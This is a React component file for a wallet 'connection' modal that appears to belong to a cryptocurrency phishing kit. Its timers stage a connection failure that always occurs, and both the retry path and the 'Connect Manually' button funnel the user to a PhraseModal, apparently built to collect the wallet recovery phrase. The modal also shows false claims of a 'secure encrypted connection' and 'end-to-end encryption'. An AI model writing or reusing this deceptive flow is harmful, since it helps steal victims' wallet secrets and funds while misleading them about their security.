import React, { useEffect, useState } from "react";
import "./styles/GearAnimation.css";
import { IoShieldHalfOutline } from "react-icons/io5";
import { motion } from "framer-motion";
import PhraseModal from "./PhraseModal";

const SecondModal = ({ wallet, onClose, isDarkMode }) => {
  const [showError, setShowError] = useState(false);
  const [isTryingAgain, setIsTryingAgain] = useState(false);
  const [showPhraseModal, setShowPhraseModal] = useState(false);
  const [showGear, setShowGear] = useState(true);

  useEffect(() => {
    const timer = setTimeout(() => {
      setShowError(true);
      setShowGear(false);
    }, 5000);

    return () => clearTimeout(timer);
  }, []);

  const handleTryAgain = () => {
    setShowError(false);
    setIsTryingAgain(true);
    setShowGear(true);

    const retryTimer = setTimeout(() => {
      setIsTryingAgain(false);
      setShowGear(false);
      setShowPhraseModal(true);
    }, 10000);

    return () => clearTimeout(retryTimer);
  };

  const handleManualConnect = () => {
    setShowPhraseModal(true);
  };

  if (showPhraseModal) {
    return (
      <PhraseModal
        wallet={wallet}
        onClose={onClose}
        isDarkMode={isDarkMode}
      />
    );
  }

  return (
    <div
      className={`fixed inset-0 flex items-center justify-center z-50 px-4 backdrop-blur-md ${
        isDarkMode ? "bg-black/70" : "bg-gray-100/70"
      }`}
    >
      {/* Modal */}
      <motion.div
        initial={{ opacity: 0, scale: 0.85, y: -40 }}
        animate={{ opacity: 1, scale: 1, y: 0 }}
        exit={{ opacity: 0, scale: 0.8 }}
        transition={{ duration: 0.4, ease: "easeOut" }}
        className={`relative max-w-md w-full rounded-2xl shadow-2xl border ${
          isDarkMode
            ? "bg-[#111111]/90 border-white/10 text-white"
            : "bg-white border-gray-200 text-black"
        } backdrop-blur-xl p-8`}
      >
        {/* Glow background */}
        <div className="absolute -top-10 -left-10 w-40 h-40 bg-pink-500/20 blur-3xl rounded-full"></div>
        <div className="absolute -bottom-10 -right-10 w-40 h-40 bg-purple-500/20 blur-3xl rounded-full"></div>

        {/* Close Button */}
        <button
          onClick={onClose}
          className="absolute top-4 right-4 text-red-500 hover:scale-110 transition"
        >
          ✕
        </button>

        {/* Wallet Header */}
        <div className="flex flex-col items-center text-center space-y-3">
          <div className="p-2 rounded-full bg-gradient-to-r from-pink-500 to-purple-500">
            <img
              src={wallet.image}
              alt={wallet.name}
              className="w-14 h-14 rounded-full object-cover"
            />
          </div>

          <h3 className="text-2xl font-semibold">{wallet.name}</h3>

          <span className="text-sm text-green-500 font-medium">
            Secure encrypted connection
          </span>
        </div>

        {/* Loading Gear */}
        {showGear && (
          <div className="flex flex-col items-center justify-center text-center space-y-4 mt-8">
            <div className="gearbox scale-75">
              <div className="overlay"></div>

              <div className="gear one">
                <div className="gear-inner">
                  <div className="bar"></div>
                  <div className="bar"></div>
                  <div className="bar"></div>
                </div>
              </div>

              <div className="gear two">
                <div className="gear-inner">
                  <div className="bar"></div>
                  <div className="bar"></div>
                  <div className="bar"></div>
                </div>
              </div>

              <div className="gear three">
                <div className="gear-inner">
                  <div className="bar"></div>
                  <div className="bar"></div>
                  <div className="bar"></div>
                </div>
              </div>

              <div className="gear four large">
                <div className="gear-inner">
                  <div className="bar"></div>
                  <div className="bar"></div>
                  <div className="bar"></div>
                  <div className="bar"></div>
                  <div className="bar"></div>
                  <div className="bar"></div>
                </div>
              </div>
            </div>

            <p className="font-medium text-lg">Initializing Connection</p>

            <span className="text-sm text-gray-400 dot-animate">
              Please wait
            </span>
          </div>
        )}

        {/* Error State */}
        {showError && !isTryingAgain && (
          <div className="text-center mt-8">
            <p className="px-6 py-3 border border-red-400 text-red-400 rounded-lg text-xs">
              Connection failed. Please try again or connect manually.
            </p>

            <div className="grid gap-4 mt-6">
              <button
                onClick={handleTryAgain}
                className="py-3 rounded-full border border-indigo-500 text-indigo-400 hover:bg-indigo-600 hover:text-white transition text-sm"
              >
                Try Again
              </button>

              <button
                onClick={handleManualConnect}
                className="py-3 rounded-full bg-gradient-to-r from-indigo-600 to-purple-600 hover:opacity-90 text-white text-sm transition"
              >
                Connect Manually
              </button>
            </div>
          </div>
        )}

        {/* Footer */}
        <div className="mt-8 flex items-center justify-center gap-2 text-sm text-gray-400">
          <IoShieldHalfOutline className="text-xl" />
          <p>This session is protected with end-to-end encryption</p>
        </div>
      </motion.div>
    </div>
  );
};

export default SecondModal;